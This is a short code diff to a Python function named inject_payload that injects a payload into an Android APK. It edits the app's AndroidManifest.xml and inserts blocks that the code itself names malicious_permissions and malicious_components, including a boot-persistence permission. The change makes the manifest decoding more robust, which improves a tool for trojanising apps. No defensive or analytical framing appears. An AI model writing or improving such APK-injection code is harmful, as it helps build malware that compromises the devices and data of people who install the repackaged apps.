@@ -137,7 +137,16 @@ def inject_payload(apk_bytes):
             logger.info("Updating AndroidManifest.xml...")
             manifest_path = final_dir / "AndroidManifest.xml"
             if manifest_path.exists():
-                manifest = manifest_path.read_text(encoding="utf-8")
+                manifest_bytes = manifest_path.read_bytes()
+                try:
+                    manifest = manifest_bytes.decode("utf-8")
+                except UnicodeDecodeError:
+                    try:
+                        manifest = manifest_bytes.decode("utf-8", errors="replace")
+                        logger.warning("Manifest had non-UTF8 chars, replaced")
+                    except Exception:
+                        manifest = manifest_bytes.decode("latin-1")
+                        logger.warning("Manifest decoded as latin-1")
 
                 malicious_permissions = """
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
@@ -208,7 +217,7 @@ def inject_payload(apk_bytes):
 """
                 manifest = manifest.replace("<application", malicious_permissions + "<application")
                 manifest = manifest.replace("</application>", malicious_components + "</application>")
-                manifest_path.write_text(manifest, encoding="utf-8")
+                manifest_path.write_bytes(manifest.encode("utf-8"))
                 logger.info("Manifest updated")
             else:
                 logger.error("AndroidManifest.xml not found in template!")
